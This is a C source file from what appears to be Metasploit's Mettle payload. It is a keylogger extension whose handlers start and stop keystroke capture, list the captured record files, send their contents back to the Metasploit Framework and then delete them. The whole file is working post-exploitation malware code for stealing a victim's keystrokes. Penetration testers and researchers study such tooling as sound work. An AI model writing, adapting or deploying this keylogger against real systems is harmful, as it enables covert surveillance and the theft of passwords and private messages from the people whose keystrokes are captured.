/**
 * Copyright 2018 Rapid7
 * @brief keylogger extension "for use with Swift Keylogger" source file
 * @file swift2mettle.c
 */

#include <dirent.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include "extension.h"
#include "keylogger.h"
#include "swift2mettle.h"

#define DEBUG

struct keylogger_info {
	char *captured_data;
	int last_cmd;
	bool active;
};

static struct keylogger_info keylogger_info = {
	.captured_data = NULL,
	.last_cmd = KEYLOGGER_STATE_STOP,
	.active = false
};

/*
 * *** HANDLER HELPERS ***
 */

static char **current_capture_records(const char *top_level_dir, int *record_list_count)
{
	char **record_list = NULL;
	*record_list_count = 0;

	DIR *data_dir = opendir(top_level_dir);
	if (!data_dir) {
		goto done;
	}

	// Iterate through all files of capture data...
	struct dirent *type_ent;
	while ((type_ent = readdir(data_dir))) {
		if (!strcmp(type_ent->d_name, ".") || !strcmp(type_ent->d_name, "..")) {
			// Skip '.' and '..' directories...
			continue;
		}
		struct dirent *date_ent;
		char *data_date_dir_name;
		asprintf(&data_date_dir_name, "%s/%s", top_level_dir, type_ent->d_name);
		if (!data_date_dir_name) {
			continue;
		}
		DIR *data_date_dir = opendir(data_date_dir_name);
		while ((date_ent = readdir(data_date_dir))) {
			if (!strcmp(date_ent->d_name, ".") || !strcmp(date_ent->d_name, "..")) {
				// Skip '.' and '..' directories...
				continue;
			}
			struct dirent *capture_ent;
			char *data_capture_dir_name;
			asprintf(&data_capture_dir_name, "%s/%s/%s", top_level_dir, type_ent->d_name, date_ent->d_name);
			if (!data_capture_dir_name) {
				continue;
			}
			DIR *data_capture_dir = opendir(data_capture_dir_name);
			while ((capture_ent = readdir(data_capture_dir))) {
#if 0
				if (!strcmp(capture_ent->d_name, ".") || !strcmp(capture_ent->d_name, "..")) {
					continue;
				}
#endif
				if (capture_ent->d_type != DT_REG) {
					// Not a 'regular' file, we're not interested...
					continue;
				}
				char *node_name;
				asprintf(&node_name, "%s/%s/%s", type_ent->d_name, date_ent->d_name, capture_ent->d_name);
				if (!node_name) {
					continue;
				}
				record_list = realloc(record_list, (sizeof(char *) * (*record_list_count + 1)));
				record_list[*record_list_count] = node_name;
				(*record_list_count)++;
			}
			closedir(data_capture_dir);
			free(data_capture_dir_name);
		}
		closedir(data_date_dir);
		free(data_date_dir_name);
	}
	closedir(data_dir);

done:
	return record_list;
}

/*
 * *** TLV COMMAND HANDLERS ***
 */

/*
 * Start capturing keypresses.
 */
static struct tlv_packet *request_capture_start(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

	if (keylogger_info.active) {
		// Already capturing on this target.
		tlv_result = TLV_RESULT_EINVAL;
		goto done;
	}

	keylogger_info.last_cmd = KEYLOGGER_STATE_START;

done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Stop capturing keypresses.
 */
static struct tlv_packet *request_capture_stop(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

	if (!keylogger_info.active) {
		// We aren't capturing on this target.
		tlv_result = TLV_RESULT_EINVAL;
		goto done;
	}

	keylogger_info.last_cmd = KEYLOGGER_STATE_STOP;

done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Return current keylogging status.
 */
static struct tlv_packet *request_capture_status(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_SUCCESS;
	struct tlv_packet *r = tlv_packet_response(ctx);

	r = tlv_packet_add_bool(r, TLV_TYPE_KEYLOGGER_STATUS, keylogger_info.active);

	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Discard/drop all captured keylog data.
 */
static struct tlv_packet *request_capture_release(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);
	char **record_names = NULL;

	tlv_result = TLV_RESULT_SUCCESS;

	if (keylogger_info.active) {
		// Currently capturing.
		tlv_result = TLV_RESULT_EINVAL;
		goto done;
	}

	int record_count, saved_record_count;
	record_names = current_capture_records(KEYLOGGER_DATA_DIR, &record_count);
	saved_record_count = record_count;
	while (record_count--) {
		// Iterate across all files of capture data and delete them...
		char *filename_with_path;
		asprintf(&filename_with_path, "%s/%s", KEYLOGGER_DATA_DIR, record_names[record_count]);
		if (!filename_with_path) {
			goto done;
		}
		unlink(filename_with_path);
		free(filename_with_path);
	}

done:
	if (record_names) {
		while (saved_record_count--) {
			free(record_names[saved_record_count]);
		}
		free(record_names);
	}
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Take captured keylogging data and ready it for
 * sending over to Metasploit Framework.
 */
static struct tlv_packet *request_capture_dump(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	int record_count;
	char **record_names = current_capture_records(KEYLOGGER_DATA_DIR, &record_count);
	while (record_count--) {
		// Iterate across all files of capture data and return their names...
		struct tlv_packet *p = tlv_packet_new(TLV_TYPE_KEYLOGGER_CAPTURE_RECORD, 0);
		p = tlv_packet_add_str(p, TLV_TYPE_KEYLOGGER_CAPTURE_RECORD_NAME, record_names[record_count]);
		r = tlv_packet_add_child(r, p);
		free(record_names[record_count]);
	}
	free(record_names);

	tlv_result = TLV_RESULT_SUCCESS;

	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Return captured keylog data to Framework.
 */
static struct tlv_packet *request_capture_dump_read(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);
	int fd = -1;

	char *record_name = tlv_packet_get_str(ctx->req, TLV_TYPE_KEYLOGGER_CAPTURE_RECORD_NAME);
	if (!record_name || strlen(record_name) == 0) {
		goto done;
	}

	char *filename_with_path;
	asprintf(&filename_with_path, "%s/%s", KEYLOGGER_DATA_DIR, record_name);
	if (!filename_with_path) {
		goto done;
	}

	fd = open(filename_with_path, O_RDONLY);
	if (fd < 0) {
		goto done;
	}

	struct stat file_stat;
	fstat(fd, &file_stat);

	// Load the contents of one "record" (file)...
	unsigned char *capture_contents = malloc(file_stat.st_size);
	if (!capture_contents) {
		goto done;
	}
	int remaining_bytes = file_stat.st_size;
	int index = 0;
	while (remaining_bytes > 0)
	{
		int read_bytes = read(fd, &capture_contents[index], remaining_bytes);
		if (read_bytes == -1) {
			goto done;
		}
		index += read_bytes;
		remaining_bytes -= read_bytes;
	}

	// Send the captured data back... 
	r = tlv_packet_add_raw(r, TLV_TYPE_KEYLOGGER_CAPTURE_RECORD_DATA, capture_contents, file_stat.st_size);

	free(capture_contents);
	close(fd);
	fd = -1;

	unlink(filename_with_path);

	free(filename_with_path);

	tlv_result = TLV_RESULT_SUCCESS;

done:
	if (fd >= 0) {
		close(fd);
	}
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Extension is shutting down, stop-and-release all the things.
 */
void keylogger_free(struct extension *e)
{
	extension_free(e);

	int record_count, saved_record_count;
	char **record_names = current_capture_records(KEYLOGGER_DATA_DIR, &record_count);
	saved_record_count = record_count;
	while (record_count--) {
		// Iterate across all files of capture data and delete them...
		char *filename_with_path;
		asprintf(&filename_with_path, "%s/%s", KEYLOGGER_DATA_DIR, record_names[record_count]);
		if (!filename_with_path) {
			goto done;
		}
		unlink(filename_with_path);
		free(filename_with_path);
	}

done:
	if (record_names) {
		while (saved_record_count--) {
			free(record_names[saved_record_count]);
		}
		free(record_names);
	}
}

void keylogger_log(char const *msg)
{
	// TODO varargs support, plz...!
#ifndef LOG_DISABLE_LOG
	zlog_time(ZLOG_LOC, "%s", msg);
#endif
}

int keylogger_get_state()
{
	return (keylogger_info.last_cmd);
}

void keylogger_set_state(int state)
{
	if (state == KEYLOGGER_STATE_START) {
		keylogger_info.active = true;
	} else if (state == KEYLOGGER_STATE_STOP) {
		keylogger_info.active = false;
	}
}

/*
 * Allow Mettle-facing event loop to run.
 */
void keylogger_poll_mettle(struct extension *e)
{
	extension_run(e, 1);
}

/*
 * Setup and register extension with mettle.
 */
struct extension *keylogger_register(void)
{
	int ret_val;

#ifdef DEBUG
	extension_log_to_mettle(EXTENSION_LOG_LEVEL_INFO);
#endif

	struct extension *e = extension();

	// Register the commands and assocaited handlers this extension provides.
	extension_add_handler(e, "keylogger_capture_start", request_capture_start, NULL);
	extension_add_handler(e, "keylogger_capture_stop", request_capture_stop, NULL);
	extension_add_handler(e, "keylogger_capture_status", request_capture_status, NULL);
	extension_add_handler(e, "keylogger_capture_release", request_capture_release, NULL);
	extension_add_handler(e, "keylogger_capture_dump", request_capture_dump, NULL);
	extension_add_handler(e, "keylogger_capture_dump_read", request_capture_dump_read, NULL);

	// Ready to go!
	extension_prep(e);

	return e;
}
